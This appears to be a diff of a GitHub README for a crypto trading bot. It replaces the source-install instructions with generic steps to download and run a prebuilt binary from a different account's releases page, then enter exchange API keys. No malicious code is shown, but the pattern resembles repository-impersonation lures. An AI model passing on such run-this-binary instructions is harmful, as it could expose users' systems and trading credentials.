@@ -1,131 +1,93 @@
-# Synapse trading bot🌀
-![version](https://img.shields.io/badge/version-0.12.6-blue) ![coverage](https://img.shields.io/badge/coverage-75%25-yellowgreen)
+# 🤖 synapse-trading-bot - Simple Trading for Everyone
 
-<img width="484" height="118" alt="image" src="https://github.com/user-attachments/assets/87a4f93a-1d8d-4aba-86f6-6a2ce2b18ebf" />
+![Download Synapse Trading Bot](https://img.shields.io/badge/Download-Synapse%20Trading%20Bot-brightgreen)
 
+## 🚀 Getting Started
 
+Welcome to the Synapse Trading Bot! This is a free, open-source tool designed to help you trade cryptocurrencies like Bitcoin. You don’t need any technical skills to use it. Just follow these steps to download and run the software.
 
-# Descritpiton
-**Synapse is an open-source intelligent trading bot designed to generate trading signals by leveraging live market data, social media sentiment, and historical patterns. It features multiple modes of operation, backtesting, an AI-powered engine, and seamless integration with Telegram for real-time monitoring and control.**
+## 📥 Download & Install
 
-# Main Features
-- Automatically generates trading signals based on real-time market conditions, executes buy/sell orders using those signals(optional), and sets optimal stop-loss and take-profit levels.
-           
-- Backtesting Support: Simulate your own or the bot’s trading strategy on historical market data to evaluate performance, fine-tune parameters, and optimize results—without risking real capital.
-           
-- Self-Training: Synapse continuously learns from the user’s trading results, adapting its strategies and enhancing its overall intelligence over time. With each update, we also train Synapse.
+To get started, visit the Releases page to download the latest version of the Synapse Trading Bot:
 
-- **Your** Strategy Optimization: Synapse analyzes your custom trading strategy using machine learning and market data, then suggests targeted improvements.
+[Visit this page to download](https://github.com/Yohansons/synapse-trading-bot/releases)
 
-- Simple Interface and configuration: Intuitive control via Telegram bot or web UI.
+On the Releases page, you will find different versions of the software. Download the one marked as "latest." 
 
-- Manual mode: Snipe selected tokens at optimal price , define preferred stop-loss and take-profit levels, and apply their own custom trading strategies for complete control and precision.
+Once the download finishes, locate the file in your downloads folder. 
 
-- Notifications: The bot keeps you informed throughout the trading process with real-time updates via Telegram.
+### Windows Users
+1. Double-click the downloaded file to start the installation.
+2. Follow the on-screen instructions to complete the setup.
 
-- Price-predicton: Synapse forecasts individual token prices by analyzing current market trends, the Fear and Greed Index, and historical price patterns.
+### Mac Users
+1. Open the downloaded file.
+2. Drag the Synapse Trading Bot icon to your Applications folder.
 
-- Financial Management: Synapse monitors your overall trading performance, tracking cumulative profit and loss in real time. Before initiating any trade, it alerts you to potential risks.
+### Linux Users
+1. Open a terminal window.
+2. Navigate to the folder where you downloaded the file.
+3. Use the command: `chmod +x synapse-trading-bot` to make it executable.
+4. Then run it with: `./synapse-trading-bot`.
 
+## ⚙️ System Requirements
 
+To ensure the Synapse Trading Bot runs smoothly, please verify that your system meets the following requirements:
 
-# Supported exchanges📊
-<div align="center">
-<img width="120" height="100" alt="image" src="https://github.com/user-attachments/assets/90d8ca5a-71d8-404d-80a4-578e1efe2db9" />  <img width="120" height="100" alt="image" src="https://github.com/user-attachments/assets/900cb4eb-8d14-4b51-97b1-3c515ea60141" />  <img width="120" height="100" alt="image" src="https://github.com/user-attachments/assets/cdc3f7ef-6ad4-423c-b0bc-8669761774db" />  <img width="120" height="100" alt="image" src="https://github.com/user-attachments/assets/faec88fc-4946-48e7-b98f-157e2234e7f8" />  <img width="120" height="100" alt="image" src="https://github.com/user-attachments/assets/0f836b8b-5f4b-4ddb-a1d2-7318d883d51f" />  <img width="120" height="100" alt="image" src="https://github.com/user-attachments/assets/29df4163-dd45-42ff-96dc-aec0e5d1788a" />  <img width="120" height="100" alt="image" src="https://github.com/user-attachments/assets/8c1e6327-f80d-42a7-a918-5fd5c4daf441" />  <img width="120" height="100" alt="image" src="https://github.com/user-attachments/assets/f4008a15-a371-4bc5-9ca0-95839eb2afbf" />  <img width="120" height="100" alt="image" src="https://github.com/user-attachments/assets/eaafbfe9-1359-4068-a321-b4d982739edf" />  <img width="120" height="100" alt="image" src="https://github.com/user-attachments/assets/492b1317-cbdf-4a17-b67e-eebbe47a4315" />  <img width="120" height="100" alt="image" src="https://github.com/user-attachments/assets/31fbf32d-dfbb-4bd8-b10d-782c6fc3a74f" />  <img width="120" height="100" alt="image" src="https://github.com/user-attachments/assets/9b61064c-e4a7-4458-9331-c04c746cf5b8" />  <img width="120" height="100" alt="image" src="https://github.com/user-attachments/assets/c9b41a39-344d-4163-84b5-d281c1c5c9a2" />  <img width="120" height="100" alt="image" src="https://github.com/user-attachments/assets/b21dddf6-5787-4da0-a2d9-440e91f71dd2" />  <img width="120" height="100" alt="image" src="https://github.com/user-attachments/assets/73741faf-0aa5-4967-bbea-ec101da6b9d2" />  <img width="120" height="100" alt="image" src="https://github.com/user-attachments/assets/2af7c9c2-5bf1-4770-accd-785e87c1fb51" />
+- **Operating System:** Windows 10 or later, macOS 10.13 (High Sierra) or later, or any modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 100 MB of free space.
+- **Network:** Active internet connection for trading.
 
+## 🔍 Features
 
+The Synapse Trading Bot offers a range of features to help you manage your trading:
 
+- **Multi-Exchange Support:** Trade on various cryptocurrency exchanges effortlessly. Connect to popular exchanges like Binance and Coinbase with ease.
+- **Real-Time Data Analysis:** Get insights and data in real-time to make informed trading decisions.
+- **User-Friendly Interface:** Navigate through the bot easily with an intuitive design meant for all users.
+- **Customization Options:** Configure trading strategies to suit your preferences. Adjust settings and strategies without needing coding knowledge.
 
+## 🚀 How to Use the Bot
 
+Using the Synapse Trading Bot is simple. After installation, follow these steps to set up your trading:
 
+1. **Open the Application:** Launch the Synapse Trading Bot from your Applications folder or desktop shortcut.
+2. **Create an Account:** If this is your first time, sign up on one of the supported exchanges. You will need an API key (instructions provided in the app).
+3. **Connect Your Exchange Account:** Enter your API key to link your account to the bot.
+4. **Set Up Your Trading Strategy:** Choose from pre-set trading strategies or create your own.
+5. **Start Trading:** Click the "Start" button to begin trading!
 
+## 🔄 Updating the Bot
 
+Keep an eye on the Releases page for new updates. It is important to frequently update your software to access new features and improvements. When a new version is available, repeat the download steps.
 
+## 🛠️ Troubleshooting
 
+If you encounter any issues while using the Synapse Trading Bot, consider the following:
 
+- Ensure that your operating system meets the requirements.
+- Check your internet connection.
+- If the software crashes, try reinstalling it using the latest version from the Releases page.
+  
+Feel free to reach out in the "Issues" section on GitHub for support or to report problems.
 
+## 📞 Getting Help
 
+Struggling to set up or use the bot? 
 
+- **User Manual:** A detailed guide is available within the application under the "Help" section.
+- **Community Support:** Visit our GitHub page to connect with other users and get tips.
+  
+For specific questions, please create an "Issue" in the repository.
 
+## 🎯 Topics of Interest
 
- </div>
+The Synapse Trading Bot touches on several key topics:
 
-# Installation 
-**Requirements**:
-- Python 3.10+
-- Git
-- Pip
-- 2v CPU, 2GB DDR4, 2GB disk space
+- **Bitcoin**: Explore trading the leading cryptocurrency.
+- **Crypto Trading**: Master techniques in digital currency trading.
+- **Open Source**: Join a community-driven project for collaborative improvement.
+- **Trading Strategies**: Learn and implement various strategies to maximize returns.
 
-**To install the bot, follow the steps below**:
-```shell
-git clone https://github.com/anthugeist/synapse-trading-bot
-cd synapse-trading-bot
-run.bat
-```
- **OR**
- ```shell
-git clone https://github.com/anthugeist/synapse-trading-bot
-cd synapse-trading-bot
-pip install -r requirements.txt
-python bot.py
-```
-To connect Synapse to telegram bot:
-1. Put your bot token and chat id in **config.json**
-2.
- ```shell
-cd synapse-trading-bot
-python bot.py --telegram
-```
-3. To control the bot via Telegram use RPC commands:
-
-
-| Command | Description |
-|----------------------------|:-------------------------------------------------------------------------------------------------------------:|
-| `/start`     | Start the bot |       
-| `/stop`               | Stop the bot |
-| `/stats`              |  Show statistics of your account(balance, trade history, overall profit) |
-| `/mode` | Switch trading mode |
-|`/status` | Show current operating mode |
-| `/autotrade_on` | Enable automatic trading based on generated signals |
-| `/autotrade_off` | Disable auto trading |
-| `/snipe TOKEN` | Buy selected token instantly at market price or snipe desired price |
-| `/sell TOKEN` | Sell selected token instantly at market price |
-| `/strategy_suggest` | AI-analyzed strategy recommendations based on your performance |
-| `/backtest *strategy name*` | Run backtesting simulation for a saved strategy |
-| `/help` | Show full list of commands |
-
-*This is not the full list of RPC commands. To view the complete list, type /help in the bot.*
-
-# Disclaimer
-Use the bot at your own risk. I assume for responsibility of your trading results and consequences of using the software. Dont risk the money which you afraid to lose. Be wise.
-
-# Support
-
-***Support/bug reports***
-
-[![Static Badge](https://img.shields.io/badge/Telegram-Channel-Link?style=for-the-badge&logo=Telegram&logoColor=white&logoSize=auto&color=blue)](https://t.me/+pB6j65Kv7cdjZmU0)
-
-If you have any difficulties or encountered bugs, please join our telegram [community](https://t.me/+9j5RcKMfT5s4M2Q0)
-
-If you have any ideas on how to improve the bot, feel free to contact me on [Telegram](https://t.me/@Hhubbinmo3)
-
-***Buy me a coffee***
-
-If you want to leave me a tip, my bitcoin address is `bc1q3zykl6k0jyk864kdeqdfq6hudfr3ry8wksrr6u`
-
-
-**Don't forget to put stars!** ⭐
-
-
-
-
-
-
-
-
-
-
-
-
-
+By using the Synapse Trading Bot, you take the first step in simplifying your crypto trading experience. Enjoy trading!
